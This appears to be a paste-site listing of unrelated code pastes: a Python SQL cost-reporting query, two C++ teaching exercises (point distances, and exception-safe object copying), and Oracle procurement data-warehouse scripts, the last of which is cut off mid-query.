        sale_line.id.as_('sale_line'),
        sale_line.unit_price.as_('sale_unit_price'),
        sale.party.as_('customer'),
        sale.shipment_party,
        template.default_uom.as_('uom'),
        sale_unit_load.id.as_('destination_unit_load'),
        sale_unit_load.product.as_('destination_product'),
        sale_unit_load.attribute_category.as_('destination_category'),
        sale_unit_load.attribute_caliber.as_('destination_caliber'),
        sale_unit_load.attribute_confection.as_('destination_confection'),
        destination_comb.product.as_('destination_base_product'),
        Case(
            (sale_unit_load.goods_receipt_line != Null, 'farm'),
            else_='warehouse').as_('destination_ul_type'),
        sale.sale_date,
        company.currency,
        currency.digits.as_('currency_digits'),
        uom.digits.as_('uom_digits'),
        invoice_query.invoice_date_min,
        Case(
            (unit_load.goods_receipt_line != Null,
                Round(Coalesce(base_query.received_quantity,
                        Coalesce(base_query.received_quantity,
                            unit_load.internal_quantity)
                        ).cast('numeric'), DIGITS)
            ), else_=Null).as_('received_quantity'),
        Round(
            Case((base_query.destination_unit_load != Null,
                Coalesce(base_query.destination_quantity, 0)),
                else_=0).cast('numeric'), DIGITS).as_('destination_quantity'),
        (sale_line.unit_price * Coalesce(
                base_query.destination_quantity, 0)).as_('sale_amount'),
        Case((
                (invoice.sale_line != Null)
                & (Coalesce(windows['sale_quantity'], 0) != 0),
            Round((Coalesce(invoice.amount, 0) * (
                Coalesce(base_query.destination_quantity, 0)
                / windows['sale_quantity'])
            ).cast('decimal'), currency.digits)
            ),
            else_=Null).as_('invoice_amount'),
        Case(((
            (invoice.sale_line != Null)
            & (Coalesce(windows['sale_quantity'], 0) != 0)),
            Round((Coalesce(invoice.quantity, 0)
                * (Coalesce(base_query.destination_quantity, 0)
                    / windows['sale_quantity'])
                ).cast('numeric'), DIGITS)),
            else_=Null).as_('invoice_quantity'),
        Case((
            Coalesce(sale_unit_load.internal_quantity, 0) == 0, 0),
            else_=Round(
                Coalesce(sale_unit_load.cases_quantity, 0).cast('numeric') * (
                    Round(
                        Case((base_query.destination_unit_load != Null,
                            Coalesce(base_query.destination_quantity, 0)),
                            else_=0).cast('numeric'), DIGITS)
                    / sale_unit_load.internal_quantity.cast('numeric')
                ).cast('numeric'), DIGITS)
        ).as_('destination_cases_quantity'),
        Coalesce(Coalesce(Case((
                (invoice.sale_line != Null)
                & (Coalesce(windows['sale_quantity'], 0) != 0),
                Round((Coalesce(invoice.amount, 0) * (
                    Coalesce(base_query.destination_quantity, 0)
                    / windows['sale_quantity'])
                ).cast('decimal'), currency.digits)
                ),
                else_=Null),
            (sale_line.unit_price * Coalesce(
                base_query.destination_quantity, 0))), 0
        ).as_('income_amount'),
        Case((
            Coalesce(sale_unit_load.internal_quantity, 0) == 0, 0),
            else_=-Round(
                (sale_unit_load.bom_amount * (
                    Round(
                        Case((base_query.destination_unit_load != Null,
                            Coalesce(base_query.destination_quantity, 0)),
                            else_=0).cast('numeric'), DIGITS)
                    / sale_unit_load.internal_quantity)).cast('decimal'),
                currency.digits)
        ).as_('bom_amount'),
        Case((
            (cost_entry.entry != Null) & (windows['entry_quantity'] != 0),
            -Round((
                Coalesce(cost_entry.amount, 0) * (
                    Coalesce(Case(
                        (unit_load.goods_receipt_line != Null,
                            Round(Coalesce(base_query.received_quantity,
                                    Coalesce(base_query.received_quantity,
                                        unit_load.internal_quantity)
                                    ).cast('numeric'), DIGITS)
                        ), else_=Null), 0)
                    / windows['entry_quantity'])).cast('decimal'),
            currency.digits)), else_=Null).as_('entry_cost_amount'),
        Case((
                Coalesce(sale_unit_load.internal_quantity, 0) != 0,
                Round(((Coalesce(-processing_scost.processing_cost_amount, 0)
                    / sale_unit_load.internal_quantity
                        ) * Round(
                        Case((base_query.destination_unit_load != Null,
                            Coalesce(base_query.destination_quantity, 0)),
                            else_=0).cast('numeric'), DIGITS)
                        ).cast('decimal'),
                    currency.digits)),
            else_=0) + Case((
                Coalesce(unit_load.internal_quantity, 0) != 0,
                Round(((Coalesce(-processing_rcost.processing_cost_amount, 0)
                    / unit_load.internal_quantity
                        ) * Case(
                        (unit_load.goods_receipt_line != Null,
                            Round(Coalesce(base_query.received_quantity,
                                    Coalesce(base_query.received_quantity,
                                        unit_load.internal_quantity)
                                    ).cast('numeric'), DIGITS)
                        ), else_=Null)).cast('decimal'),
                    currency.digits)),
                else_=0).as_('processing_cost_amount'),
        Case((
                Coalesce(sale_unit_load.internal_quantity, 0) != 0,
                Round(((Coalesce(-processing_scost.processing_fixed_cost_amount, 0)
                    / sale_unit_load.internal_quantity
                        ) * Round(
                        Case((base_query.destination_unit_load != Null,
                            Coalesce(base_query.destination_quantity, 0)),
                            else_=0).cast('numeric'), DIGITS)
                        ).cast('decimal'),
                    currency.digits)),
            else_=0) + Case((
                Coalesce(unit_load.internal_quantity, 0) != 0,
                Round(((Coalesce(-processing_rcost.processing_fixed_cost_amount, 0)
                    / unit_load.internal_quantity
                        ) * Case(
                        (unit_load.goods_receipt_line != Null,
                            Round(Coalesce(base_query.received_quantity,
                                    Coalesce(base_query.received_quantity,
                                        unit_load.internal_quantity)
                                    ).cast('numeric'), DIGITS)
                        ), else_=Null)).cast('decimal'),
                    currency.digits)),
                else_=0).as_('processing_fixed_cost_amount'),
        Case((
                Coalesce(sale_unit_load.internal_quantity, 0) != 0,
                Round(((Coalesce(-processing_scost.processing_labor_cost_amount, 0)
                    / sale_unit_load.internal_quantity
                        ) * Round(
                        Case((base_query.destination_unit_load != Null,
                            Coalesce(base_query.destination_quantity, 0)),
                            else_=0).cast('numeric'), DIGITS)
                        ).cast('decimal'),
                    currency.digits)),
            else_=0) + Case((
                Coalesce(unit_load.internal_quantity, 0) != 0,
                Round(((Coalesce(-processing_rcost.processing_labor_cost_amount, 0)
                    / unit_load.internal_quantity
                        ) * Case(
                        (unit_load.goods_receipt_line != Null,
                            Round(Coalesce(base_query.received_quantity,
                                    Coalesce(base_query.received_quantity,
                                        unit_load.internal_quantity)
                                    ).cast('numeric'), DIGITS)
                        ), else_=Null)).cast('decimal'),
                    currency.digits)),
                else_=0).as_('processing_labor_cost_amount'),
            Case((
                Coalesce(sale_line.quantity, 0) != 0,
                -Round((Coalesce(
                    sale_cost_query.amount, 0) * (
                    Round(
                        Case((base_query.destination_unit_load != Null,
                            Coalesce(base_query.destination_quantity, 0)),
                            else_=0
                            ).cast('numeric'), DIGITS) / sale_line.quantity)
                                ).cast('decimal'), currency.digits)),
                else_=0).as_('sale_cost_amount'),
            Case(((
                (sale_account_query.sale_line != Null)
                & (Coalesce(windows['sale_quantity'], 0) != 0)),
                Round((Coalesce(sale_account_query.quantity, 0)
                    * (Coalesce(base_query.destination_quantity, 0)
                        / windows['sale_quantity'])
                ).cast('numeric'), DIGITS)),
                else_=Null).as_('sold_account_quantity'),
        where=(
            (receipt.company == 1)
            & (Coalesce(receipt.effective_date, from_date) > from_date))
    )

print(query)
print(query.params)
"
qmD0p666,邀您一起看：热辣滚烫,xiaomianao666,JavaScript,Tuesday 23rd of April 2024 09:37:20 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥热辣滚烫@@
j7pFs4WQ,Untitled,irmantas_radavicius,C++,Tuesday 23rd of April 2024 09:17:29 AM CDT,"#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <cmath>
#include <cctype>

using namespace std;

struct Point {

    double x;
    double y;
    string s;

    Point(string s){
        this->s = s;
        x = 0;
        y = 0;
    }

    Point(string s, int x, int y){
        this->s = s;
        this->x = x;
        this->y = y;
    }

    void print(){
        cout << s << "": ("" << x << "","" << y << "")"" << endl;
    }

    void read(){
        cout << s << "" taskas, ivesk dvi koordinates: "";
        cin >> x >> y;
        this->s = s;
    }

    double getDistance(Point q){
        double dx = this->x-q.x;
        double dy = this->y-q.y;
        return sqrt(dx*dx + dy*dy);
    }

};





int main(){

    Point p1(""Pirmas"", 1, 2), p2(""Antras"", 4, 5), p3(""Trecias"");
    p3.read();

    cout << ""Turime tris taskus: "" << endl;
    p1.print();
    p2.print();
    p3.print();

    cout << ""Atstumas tarp p1 ir p2 yra "" << p1.getDistance(p2) << endl;
    cout << ""Atstumas tarp p1 ir p3 yra "" << p1.getDistance(p3) << endl;

    return 0;
}
"
R5bJSVEG,СПРИНТ № 7 | Модель памяти в C++ | Урок 9: Копирование объектов. Часть третья 2/2,chevengur,C++,Tuesday 23rd of April 2024 09:10:01 AM CDT,"octopus.h

#pragma once

// Тут можно подключить scopedptr.h и ptrvector.h, 
// если они вам понадобятся.
#include ""ptrvector.h""
#include ""scopedptr.h""
#include <new> // Для исключения bad_alloc
#include <vector>

// Щупальце
class Tentacle {
public:
    explicit Tentacle(int id) noexcept
        : id_(id) {
    }

    int GetId() const noexcept {
        return id_;
    }

    Tentacle* GetLinkedTentacle() const noexcept {
        return linked_tentacle_;
    }
    void LinkTo(Tentacle& tentacle) noexcept {
        linked_tentacle_ = &tentacle;
    }
    void Unlink() noexcept {
        linked_tentacle_ = nullptr;
    }

private:
    int id_ = 0;
    Tentacle* linked_tentacle_ = nullptr;
};

// Осьминог
class Octopus {
public:
    Octopus()
        : Octopus(8) {
    }

    explicit Octopus(int num_tentacles) {
        Tentacle* t = nullptr;
        try {
            for (int i = 1; i <= num_tentacles; ++i) {
                t = new Tentacle(i);      // Может выбросить исключение bad_alloc
                tentacles_.GetItems().push_back(t);  // Может выбросить исключение bad_alloc
                
                // Обнуляем указатель на щупальце, которое уже добавили в tentacles_,
                // чтобы не удалить его в обработчике catch повторно
                t = nullptr;
            }
        }
        catch (const std::bad_alloc&) {
            // Удаляем щупальца, которые успели попасть в контейнер tentacles_
            Cleanup();
            // Удаляем щупальце, которое создали, но не добавили в tentacles_
            delete t;
            // Конструктор не смог создать осьминога с восемью щупальцами,
            // поэтому выбрасываем исключение, чтобы сообщить вызывающему коду об ошибке
            // throw без параметров внутри catch выполняет ПЕРЕВЫБРОС пойманного исключения
            throw;
        }
    }

    ~Octopus() {
        // Осьминог владеет объектами в динамической памяти (щупальца),
        // которые должны быть удалены при его разрушении.
        // Деструктор - лучшее место, чтобы прибраться за собой.
        Cleanup();
    }

    // Добавляет новое щупальце с идентификатором,
    // равным (количество_щупалец + 1):
    // 1, 2, 3, ...
    // Возвращает ссылку на добавленное щупальце
    Tentacle& AddTentacle() {
        ScopedPtr<Tentacle>tentacle(new Tentacle(GetTentacleCount() + 1));
        tentacles_.GetItems().push_back(tentacle.GetRawPtr());
        tentacle.Release();
        return *tentacles_.GetItems().back();
    }

    int GetTentacleCount() const noexcept {
        return static_cast<int>(tentacles_.GetItems().size());
    }

    const Tentacle& GetTentacle(size_t index) const {
        return *tentacles_.GetItems().at(index);
    }
    Tentacle& GetTentacle(size_t index) {
        return *tentacles_.GetItems().at(index);
    }

private:
    void Cleanup() {
        // Удаляем щупальца осьминога из динамической памяти
        for (Tentacle* t : tentacles_.GetItems()) {
            delete t;
        }
        // Очищаем массив указателей на щупальца
        tentacles_.GetItems().clear();
    }
    
    // Вектор хранит указатели на щупальца. Сами объекты щупалец находятся в куче
    
    PtrVector<Tentacle> tentacles_;
};

=======================================================================================================================================

ptrvector.h

#pragma once

#include <vector>

template <typename T>
class PtrVector {
public:
    PtrVector() = default;

    // Создаёт вектор указателей на копии объектов из other
    PtrVector(const PtrVector& other) {
        // Резервируем место в vector-е для хранения нужного количества элементов
        // Благодаря этому при push_back не будет выбрасываться исключение
        items_.reserve(other.items_.size());

        try {
            for (auto p : other.items_) {
                // Копируем объект, если указатель на него ненулевой
                auto p_copy = p ? new T(*p) : nullptr;  // new может выбросить исключение

                // Не выбросит исключение, т. к. в vector память уже зарезервирована
                items_.push_back(p_copy);
            }
        }
        catch (...) {
            // удаляем элементы в векторе и перевыбрасываем пойманное исключение
            DeleteItems();
            throw;
        }
    }

    // Деструктор удаляет объекты в куче, на которые ссылаются указатели,
    // в векторе items_
    ~PtrVector() {
        DeleteItems();
    }

    // Возвращает ссылку на вектор указателей
    std::vector<T*>& GetItems() noexcept {
        return items_;
    }

    // Возвращает константную ссылку на вектор указателей
    std::vector<T*> const& GetItems() const noexcept {
        return items_;
    }

private:
    void DeleteItems() noexcept {
        for (auto p : items_) {
            delete p;
        }
    }

    std::vector<T*> items_;
};

=======================================================================================================================================

scopedptr.h

#pragma once

#include <stdexcept> // содержит std::logic_error

template <typename T>
class ScopedPtr {
public:
    ScopedPtr() = default;

    explicit ScopedPtr(T* raw_ptr) noexcept
        : ptr_(raw_ptr) {
    }

    // Запрещаем копирование указателя
    ScopedPtr(const ScopedPtr&) = delete;

    ~ScopedPtr() {
        delete ptr_;
    }

    T* GetRawPtr() const noexcept {
        return ptr_;
    }

    T* Release() noexcept {
        T* p = ptr_;
        ptr_ = nullptr;
        return p;
    }

    explicit operator bool() const {
        return ptr_ != nullptr;
    }

    T* operator->() const {
        using namespace std::literals;
        if (!ptr_) {
            throw std::logic_error(""Scoped ptr is null""s);
        }
        return ptr_;
    }

    T& operator*() const {
        using namespace std::literals;
        if (!ptr_) {
            throw std::logic_error(""Scoped ptr is null""s);
        }
        return *ptr_;
    }

private:
    T* ptr_ = nullptr;
};

=======================================================================================================================================

main.cpp

#include ""octopus.h""

#include <cassert>
#include <iostream>

using namespace std;

int main() {
    // Проверка конструирования осьминогов
    {
        // По умолчанию осьминог имеет 8 щупалец
        Octopus default_octopus;
        assert(default_octopus.GetTentacleCount() == 8);

        // Осьминог может иметь отличное от 8 количество щупалец
        Octopus quadropus(4);
        assert(quadropus.GetTentacleCount() == 4);

        // И даже вообще не иметь щупалец
        Octopus coloboque(0);
        assert(coloboque.GetTentacleCount() == 0);
    }

    // Осьминогу можно добавлять щупальца
    {
        Octopus octopus(1);
        Tentacle* t0 = &octopus.GetTentacle(0);
        Tentacle* t1 = &octopus.AddTentacle();
        assert(octopus.GetTentacleCount() == 2);
        Tentacle* t2 = &octopus.AddTentacle();
        assert(octopus.GetTentacleCount() == 3);

        // После добавления щупалец ранее созданные щупальца не меняют своих адресов
        assert(&octopus.GetTentacle(0) == t0);
        assert(&octopus.GetTentacle(1) == t1);
        assert(&octopus.GetTentacle(2) == t2);

        for (int i = 0; i < octopus.GetTentacleCount(); ++i) {
            assert(octopus.GetTentacle(i).GetId() == i + 1);
        }
    }

    // Осьминоги могут прицепляться к щупальцам друг друга
    {
        Octopus male(2);
        Octopus female(2);

        assert(male.GetTentacle(0).GetLinkedTentacle() == nullptr);

        male.GetTentacle(0).LinkTo(female.GetTentacle(1));
        assert(male.GetTentacle(0).GetLinkedTentacle() == &female.GetTentacle(1));

        male.GetTentacle(0).Unlink();
        assert(male.GetTentacle(0).GetLinkedTentacle() == nullptr);
    }

    // Копия осьминога имеет свою собственную копию щупалец, которые
    // копируют состояние щупалец оригинального осьминога
    {
        // Перебираем осьминогов с разным количеством щупалец
        for (int num_tentacles = 0; num_tentacles < 10; ++num_tentacles) {
            Octopus male(num_tentacles);
            Octopus female(num_tentacles);
            // Пусть они хватают друг друга за щупальца
            for (int i = 0; i < num_tentacles; ++i) {
                male.GetTentacle(i).LinkTo(female.GetTentacle(num_tentacles - 1 - i));
            }

            Octopus male_copy(male);
            // Проверяем состояние щупалец копии
            assert(male_copy.GetTentacleCount() == male.GetTentacleCount());
            for (int i = 0; i < male_copy.GetTentacleCount(); ++i) {
                // Каждое щупальце копии размещается по адресу, отличному от адреса оригинального щупальца
                assert(&male_copy.GetTentacle(i) != &male.GetTentacle(i));
                // Каждое щупальце копии прицепляется к тому же щупальцу, что и оригинальное
                assert(male_copy.GetTentacle(i).GetLinkedTentacle() == male.GetTentacle(i).GetLinkedTentacle());
            }
        }
        // Если вы видите эту надпись, то разрушение осьминогов, скорее всего,
        // прошло без неопределённого поведения
        cout << ""Everything is OK""s << endl;
    }
}"
LejC9UWU,sgoz,GLASHATAY_007,Oracle 11,Tuesday 23rd of April 2024 09:07:46 AM CDT,"truncate table dwh_detailing_sg_general_2024;
insert into dwh_detailing_sg_general_2024 
Select Case When s.owner_inn='7820075581' Then '146504' Else to_char(org.id) End id,
       Case When s.owner_inn='7820075581' Then '7820076257' Else s.owner_inn End contragent_inn, 
       org.kpp, Upper(Coalesce(org.full_name, u.full_name)) full_name,
       org.short_name,
       Case when s.contragent_inn in ('7838479881','7838489103') Then 'КОМИТЕТ ПО ТРУДУ И ЗАНЯТОСТИ НАСЕЛЕНИЯ САНКТ-ПЕТЕРБУРГА'  Else org.grbs_full_name End grbs_name,       
       org.parentid,
       org.grbs_inn, vg.vg_name vg,  s.year,
       s.contragent_account,
       s.targetexpenseitemcode,s.fund, t.np_code_name,t.fp_code_name,
	   Case When s.targetexpenseitemcode In (Select targetexpenseitemcode From dwh_targetexpenseitemcode_aip) and  s.cvr not in ('244') 
       or (s.targetexpenseitemcode in ('022E15305F','021E15305F') and s.cvr='414' and s.kosgu='310' and s.contragent_inn='7809025523')Then 'Да' Else 'Нет'              
       End priznak,--Признак совпадения целевой статьи (АИП)
       S.budget_type,s.cvr,s.kosgu, sum sgoz,
       Case When owner_inn<>contragent_inn Then 1 Else 0 End flag_pp,
	   s.REQ --код запроса
From (

       Select s.* From dwh_kf_sgoz_zak s Left Join dwh_organization_kgntv o On (s.owner_inn=o.inn)
        Where  s.year = 2024
                And s.flag_ab = 1
                And (o.role_code<>10 or (s.contragent_inn='7813046420' and s.targetexpenseitemcode='0810071170')) -- письмо Л.А.Крицкой от 14.04.2021 Исключить автономные учреждения. НО добавить МУЗЫКАЛЬНЫЙ ТЕАТР по этой цс письмо от 18.05.2023
                And s.budget_type in ('СИЦ','СГЗ')
                And (s.kosgu in ('214','221', '222', '223', '224', '225', '226', '227', '228', '229','310', '320', '340', '341', '342', '343', '344', '345', '346', '347', '349', '352', '353') 
                or (s.kosgu='263'  and o.inn<>'7825357195' ))-- добавить КОСГУ 214 и добавить КОСГУ 263 кроме ИНН 7825357195(СПб ГБУ ""ЦОО ""Молодежный» )
                And s.cvr not in ('415','452','466') -- письмо Л.А.Крицкой от 14.04.2021
                And ((s.cvr <> '323' And o.grbs_inn in ('7825675663','7840013199')
                     Or (o.grbs_inn not in ('7825675663','7840013199')))  
                    )-- письмо Л.А.Крицкой от 14.04.2021. Исключить фин-ие по КВР 323 у Комитета по социальной политике Санкт-Петербурга и Жилищного комитета и их подведомственных учреждений 
                -- And ((s.kosgu<>'263' and o.inn='7825357195') or (o.inn<>'7825357195') ) --14.09.2022 -вернуть  у ком по образованию КОСГУ 263 кроме ИНН 7825357195)
                -- And (o.grbs_inn='7830002053' And s.kosgu<>'263' or nvl(o.grbs_inn,1)<>'7830002053') --02.09.2021 Терехова И.В. отключить у ком по образованию КОСГУ 263
                And s.kosgu not in ('297','267')
                 
        union 

        Select s.* From dwh_kf_sgoz_zak s Left Join dwh_organization_kgntv o On (s.owner_inn=o.inn)
        Where  s.year = 2024
               And s.flag_ab = 0 And s.flag_budget_current=1 And 
               ((s.cvr Between 200 And 247 )
                 or (s.cvr = 323 And (( o.grbs_inn  not in ('7825675663','7840013199')) or (s.targetexpenseitemcode='0330040750' And  s.contragent_inn = '7806042256' and s.year < 2024) or (s.targetexpenseitemcode='0350040750' And  s.contragent_inn = '7806042256' and s.year = 2024)))--комитет по социальной политике (+ жилищный комитет Белоусова А.А 21.12.2020 кроме СПб ГКУ ""ГОРОДСКОЙ ИНФОРМАЦИОННО-РАСЧЕТНЫЙ ЦЕНТР"" (добавлен КВР 323 по письму от Крицкой Л.А. 09.09.2022
                Or ((s.cvr = 414 Or s.cvr = 412) And s.kosgu not in (298,299,530)))     
               And s.cvr not in ('415','452','466') -- письмо Л.А.Крицкой от 14.04.2021 
                --And (o.inn='7825357195' And s.kosgu<>'263') --02.09.2021 Терехова И.В. отключить у ком по образованию КОСГУ 263
               And s.kosgu not in ('297','267')
        )   s
Join dwh_kf_ul u on s.CONTRAGENT_INN=u.code And u.year=2024
left Join (Select Distinct fp_code, fp_code_name, np_code_name From dwh_targetexpenseitemcode_2020 ) t on s.FP_CODE=t.FP_CODE
left Join dwh_organization_kgntv org On s.owner_inn=org.inn 
Left Join dwh_vg vg On vg.grbs_id=org.parentid
Where s.flag_budget_current=1 
      And s.owner_inn<>'7812026622' --02.09.2021 Терехова И.В.
      And s.owner_inn<>'7811040938' -- 14.01.2022 Крицкая Л.А. организация является автономным учреждением
      And org.id<>1610 --16.11.2021 Письмо Крицкой Л.А. 
;"
vwQdy0gq,Untitled,GLASHATAY_007,Oracle 11,Tuesday 23rd of April 2024 09:06:59 AM CDT," truncate table dwh_detailing_con_general_2024;
 insert into dwh_detailing_con_general_2024
 
with zak as
(Select 
    fin.lotuuid ,
    sum(fin.finvalue) fin_zak
  from dwh_lot_fin_kgntv fin
  Join (select distinct contragent_inn,targetexpenseitemcode from dwh_kf_sgoz_kgntv Where year=2024 and flag_budget_current=1) t On t.contragent_inn=fin.inn and t.targetexpenseitemcode=fin.targetexpenseitemcode 
  -- изменение от 30.09.2020 сделано из-за раздвоения строк по косгу
  Where finyear=to_number(2024)
  Group by fin.lotuuid),
publ_full as 
(Select 
    tru.lot_id,
    sum(tru.fulfilled_cost_doc)fulfilled_cost_doc
From dwh_contract_tru_kgntv tru
Inner Join dwh_contract_kgntv c on tru.lot_id=c.lotid and length(c.contractrnk)=13 and fulfilment_sum is null
Group by tru.lot_id)
 
Select Case When con.customerinn='7820075581' Then '146504' --в связи с тем, что данный садик реорганзивался в садик с ИНН=7820076257 необходимо суммировать
            When pro.delegated=1 Then pro.orgid Else to_char(con.customerid) End customerid,
       Case When pro.delegated=1 Then pro.orgtitle Else con.customername End customername, 
       org.short_name,
       Case When con.customerinn='7820075581' Then '7820076257' --в связи с тем, что данный садик реорганзивался в садик с ИНН=7820076257 необходимо суммировать
            When pro.delegated=1 Then org_pp.inn 
            Else con.customerinn End customerinn, 
       Case When pro.delegated=1 Then org_pp.kpp Else org.kpp End customerkpp, 
       Case When pro.delegated=1 Then pro.grbstitle Else con.grbsname End grbsname,
       Case When pro.delegated=1 Then org_pp.grbs_inn Else org.grbs_inn End grbs_inn, 
       Case When pro.delegated=1 Then pro.grbsid Else to_char(org.parentid) End grbsid,
       vg.vg_name vg, --вицегубернатор
       pro.pg_ikz, pro.pg_n, pro.pg_rn,pro.reqnum,
       pro.first_notice_try,--  Дата первой успешно отправленной версии извещения (xml-пакета)в ЕИС ( НЕ ВСЕГДА = Дате публикации извещения) 
       pro.F_PRODUCTPRICE,
       nvl(pro.f_productprice,con.contractsigningprice) nmck_rasch,
       zak.fin_zak, --сумма финансирвоания 2021 по закупке
      case when pro.joflag=1 then 1 else 0 end sovm,
      cons.orgtitle cons_org,
      case when pro.placement='Централизованная закупка' then 1 else 0 end centr,
      tar.flag_pp, --в рамках ч.6п.15 (переданные полномочия)      
      Case When pro.delegated=1 Then pro.orgtitle Else null End org_pp, --организац, осуществляющая полномочия заказчика
      con.CONTRACTRNK, con.contractsigndate, 
      con.contractsigningprice, 
      con.contractfullprice, --добавлено 16.11.20211 по письму Крицкой Л.А.
      tar.finsum, --сумма финансирования 2021 по контракту 
      tar.expensetypecode, tar.kosgucode,
      tar.budget_type, -- тип финансирования
	  tar.fund_code, 
      tar.req_code, --  код запроса ( добавлено 14.07.2023 по просьбе Крицкой Л.А.)
      con.ORDERTYPENAME,con.CONTRACTONEEXECREASON,
      con.stagetitle,
      con.contract_execution_start_date,--дата начала исполнения контракта
      con.contractplaneexecdate,
      con.CONTRACTREJECTDATE,
      tar.year fin_year, --год финансирования
      tar.targetexpenseitemcode, --целевая статья из контракта
     -- zak.targetexpenseitemcode targ_zak, --целевая статья из закупки
      t.NP_CODE_NAME,
      t.FP_CODE_NAME,
   --   ROW_NUMBER() over (partition by 1 order by con.CUSTOMERNAME desc) rn, 
      case 
        when (tar.targetexpenseitemcode in ( select targetexpenseitemcode from dwh_targetexpenseitemcode_aip ) and tar.expensetypecode not in ('244'))
        or (tar.targetexpenseitemcode in ('022E15305F','021E15305F') and tar.expensetypecode='414' and tar.kosgucode='310' and con.customerinn='7809025523') -- правило по письму крицкой от 5.10.222       
        then 'Да' else 'Нет'            
      end priznak_aip,--Признак совпадения целевой статьи (АИП)
      tar.finsum_f,
      tar.lot_id, 
	  Case When (pro.sed_reg_number is not null or pro.request_order_number is not null) Then 1 Else 0 End UOPLACING, 
	  org_uo.FULL_NAME uo_org,
      CON.CONTRACTSUBJECT,
      con.supplierinn,
      con.suppliername,
      to_char(con.supplierkpp)supplierkpp,
      Case When pro.delegated=1 Then org_pp.contragent_account 
      Else org.contragent_account End contragent_account, --код заказчика
      con.contractactualpaid, --фактически оплачено всего
      nvl(con.fulfilment_sum,publ_full.fulfilled_cost_doc)fulfilment_sum,--стоимость исполненных поставщиком обязательств в валюте исполнения (по письму Тереховой от 22.08.2022)
      pro.date_notice_published,-- Дата размещения первой версии извещения на ЕИС
      con.price_type, -- Способ указания цены контракта
      con.suppliertype,
      con.RTC_PRICE,
      con.supply_impossible

FROM  dwh_contract_kgntv con
Left Join dwh_organization_not_zak org on org.id=con.customerid   -- 05.07.2023 вместо inner указан left, по причине не попадания контрактов у не актуальных орг-ций.
                                    And contractrnk not in ('2782534239015000190','2783845426019000015','7400319000003','7400319000002','2783845426019000014','2783845426019000021','2783845426019000018') --Контракты отключены по сообщению Рябовой 13 сентября
                                    And con.customerid in (select id from dwh_organization_not_zak ) --необходимо убрать учреждения законодательной власти
                                    And org.id<>1610--16.11.2021 Письмо Крицкой Л.А. 
Inner Join
 (
    Select fin.lot_id,fin.year,fin.finsum,fin.finsum_f,fin.targetexpenseitemcode, fin.expensetypecode, fin.kosgucode, fin.budget_type, fin.flag_pp ,fin.fund_code,req_code
        From FIN_TARG_CON_2024_VIEW fin   -- 28.09.22 создана View с инф-цией по финансированию по контрактам(с 3-мя union)              
       Where fin.finsum is not null                       
  )tar
ON con.LOTID = tar.LOT_ID
Left join zak on zak.lotuuid=con.lot_cons_m 
Left join zak on tar.lot_id=zak.lotuuid 
left join dwh_procedures_kgntv pro on pro.LOTUUID = con.lotid
left join dwh_procedures_cons_kgntv cons on cons.lotuuid=pro.joint_procedure_id
left join DWH_ORGANIZATION_KGNTV org_uo on org_uo.ID = pro.UO_ORGID
left Join (select distinct targetexpenseitemcode,FP_CODE_NAME,NP_CODE_NAME from DWH_TARGETEXPENSEITEMCODE_2020) t on t.targetexpenseitemcode=tar.targetexpenseitemcode
Left Join DWH_ORGANIZATION_KGNTV org_pp on org_pp.id=pro.orgid and pro.delegated=1
Left join dwh_vg_22 vg On vg.grbs_id=con.grbsid
Left Join publ_full on publ_full.lot_id=con.LOTID
where ((con.CONTRACTREJECTDATE is not null and tar.finsum_f is not null and tar.finsum_f<>0) or con.CONTRACTREJECTDATE is null )
-- 05.07.2023 вместо inner указан left, по причине не попадания контрактов у не актуальных орг-ций.
and org.inn not in ('7812031703','7838468985','7812050079','7802215250','7804169391','7814143064','7802215268','7842000050','7804169401','7813188464','7801238167','7816226189','7811139084','7814143057','7816226502',
              '7842000068','7819029196','7819029206','7839000318','7843000046','7843000039','7810293894','7820038893','7817044400','7820038903','7806143737','7807053821','7810293904','7805283273','7806143720',
              '7811139119','7807053839','7805283280','7813585510','7840425330','7838389412','7825439419','7830001028','7830000426','7830001758'
             )
             and org.full_name not like 'ТЕРРИТОРИАЛЬНАЯ ИЗБИРАТЕЛЬНАЯ КОМИССИЯ%'
;
 
insert into dwh_detailing_con_general_2024
With 
con As (
            Select c.*,contract.suppliertype,contract.rtc_price, contract.supply_impossible,contract.supplierkpp, ROW_NUMBER() Over (Partition By c.contract_regnum Order By  c.contract_regnum desc) rn
            From dwh_contracts_delegated c 
            left join dwh_contract_kgntv contract on contract.contractrnk=c.contract_regnum
            where (c.contract_regnum, c.versionnumber) In (
                                                             Select contract_regnum, Max(versionnumber)
                                                             From dwh_contracts_delegated
                                                             Group by contract_regnum
                                                          )
                  and c.paymentyear=2024                          
                  and contract.contractrnk is null
				 --and c.exec_startyear=extract(year from sysdate)  -- правило добавлено т.к. записи дублируются из-за чего неправильно считается экономия пример контракт 2782536397817000078
       ),
proc As (
            Select *
            From (
                    Select p.*, ROW_NUMBER() Over (Partition By p.purchasenumber Order By p.docpublishdate desc) rn
                    From dwh_procedures_delegated p
                 ) p
            Where rn=1 
         ) 
 
Select to_char(org.id) orgid, org.full_name,org.short_name,org.inn, org.kpp, org.grbs_full_name, grbs_inn, to_char(org.parentid) parentid,
       vg.vg_name vg, --вицегубрнатор 
       Coalesce(pos.pg_ikz, con.purchasecode, notice.purchasecode) pg_ikz,
       Coalesce(pos.pg_n, notice.tenderplan) pg_n,    
       Case when con.positionnumber is not null then con.positionnumber Else proc.positionnumber End positionnumber,
       con.notificationnumber,
       null fitst_notice_try,--дата размещения первой версии извещения
       proc.maxprice,--нмцк
       coalesce(proc.maxprice,con.contract_price) nmck_rasch, --нмцк расчетное поле
        Case
            When proc.currentyear is null Then null
            When 2024 = proc.currentyear then proc.finsum_currentyear 
            When 2024-1 = proc.currentyear then proc.finsum_firstyear 
            When 2024-2 = proc.currentyear then proc.finsum_secondyear 
        end finsum_zak,
        0 sovm, --совместная закупка
        null As c_org, --Наименование организации, разместившей извещение
        0 centr, --централизовання закупка
        1 flag_pp,
        con.responsibleorg_fullname, -- Организация, осуществляющая полномочия заказчика
        con.contract_regnum, --РНК
        con.contract_signdate, --дата заключения контракта
        con.contract_price, --цена контракта на момент заключения
        con.contract_price contractfullprice, --текущая цена контракта
        con.paymentsum, --сумма финансирования
        con.kvr,
        null kosgu,--косгу
        null budjet_type,--тип финансирования
		null fund_code, -- код фонда
        null req_code, --код запроса
        Case When con.placing In ('13013') Then 'Запрос котировок в электронной форме'
             When con.placing In ('12011') Then 'Аукцион в электронной форме'
             When con.placing In ('14013') Then 'Запрос предложений в электронной форме'
